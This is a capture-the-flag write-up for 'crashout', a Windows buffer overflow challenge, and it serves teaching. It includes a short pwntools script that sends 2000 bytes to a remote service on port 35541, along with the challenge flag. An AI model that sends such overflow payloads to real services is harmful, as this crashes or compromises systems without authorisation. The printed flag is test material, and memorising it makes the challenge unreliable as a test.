# crashout - CTF Writeup

## Challenge Overview
This is a Windows binary exploitation challenge where we need to exploit a basic buffer overflow vulnerability to obtain the flag from a remote server.

## Initial Analysis

The challenge provides a Windows executable (`crashout.exe`) running on a remote server (port 35541). The server accepts input over the network and processes it. Running basic tests reveals that the binary has a buffer overflow vulnerability.

## Identifying the Vulnerability

By examining the binary (using a disassembler like Ghidra or IDA), we can identify that the program:

1. Accepts input from the network connection
2. Stores the content in a fixed-size buffer
3. Does not properly validate the input length

When we provide input exceeding the buffer limit, the program exhibits undefined behavior - a classic buffer overflow scenario.

## Exploitation Strategy

The vulnerability is straightforward: the program doesn't check if the input exceeds the buffer size. By providing a large amount of data (2000 bytes), we can overflow the buffer.

In this case, the overflow triggers a condition that causes the program to reveal the flag from the server.

## Getting the Flag

### Step 1: Create the exploit script

The exploit is simple - we just need to send a large payload (2000 bytes) to the remote server:

```python
#!/usr/bin/env python3
from pwn import *
import sys

# Connect to the server
conn = remote(sys.argv[1], 35541)

# Send 2000 'A' characters
payload = b'A' * 2000
conn.send(payload)

# Receive and print the response
print(conn.recvall().decode())

conn.close()
```

### Step 2: Run the exploit

```bash
python3 soln.py <server_ip>
```

The script will:
1. Connect to the remote server on port 35541
2. Send 2000 bytes of data to overflow the buffer
3. The overflow triggers the flag retrieval mechanism on the server
4. Receive and print the flag

Output:
```
SPARK{buff3r_0v3rfl0w_v1ct0ry!}
```

## Key Takeaways

1. **Buffer Overflows**: When programs don't validate input length against buffer sizes, attackers can write beyond intended memory boundaries
2. **Input Validation**: Always validate input length before copying to fixed-size buffers
3. **Bounds Checking**: Using safe string functions that perform bounds checking can prevent such vulnerabilities

## Flag
`SPARK{buff3r_0v3rfl0w_v1ct0ry!}`
